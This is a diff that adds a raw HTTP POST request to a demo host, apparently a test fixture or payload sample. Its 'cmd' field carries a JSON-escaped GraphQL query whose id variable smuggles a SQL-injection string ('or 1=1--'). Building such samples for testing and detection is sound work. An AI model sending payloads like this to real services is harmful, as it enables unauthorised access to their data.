@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 155
+Connection: close
+
+cmd={\u0022query\u0022:\u0022query x($id:String){user(where:{id:{eq:$id}}){id}}\u0022,\u0022variables\u0022:{\u0022id\u0022:\u0022x\\u0022 or 1=1--\u0022}}
